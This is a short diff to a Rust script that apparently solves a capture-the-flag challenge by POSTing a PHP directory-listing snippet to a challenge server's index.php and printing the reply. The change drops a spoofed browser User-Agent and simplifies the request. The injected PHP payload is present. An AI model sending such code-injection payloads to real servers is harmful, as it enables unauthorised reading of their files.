@@ -2,7 +2,7 @@
 
 extern crate reqwest;
 
-use reqwest::{Client, Url, header::UserAgent};
+use reqwest::{Client, Url};
 
 fn main() {
     const URL: &str = "http://ctfq.sweetduet.info:10080/~q12/index.php";
@@ -13,7 +13,6 @@ fn main() {
 
     let client = Client::new();
 
-    const USER_AGENT: &str = "Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0";
     const CODE: &str = r#"
 <?php
 
@@ -28,12 +27,8 @@ closedir($res_dir);
 ?>
 "#;
 
-    let mut response = client
-        .post(url)
-        .header(UserAgent::new(USER_AGENT))
-        .body(CODE)
-        .send()
-        .unwrap();
+    let mut response = client.post(url).body(CODE).send().unwrap();
     let body = response.text().unwrap();
+
     println!("{}", body);
 }
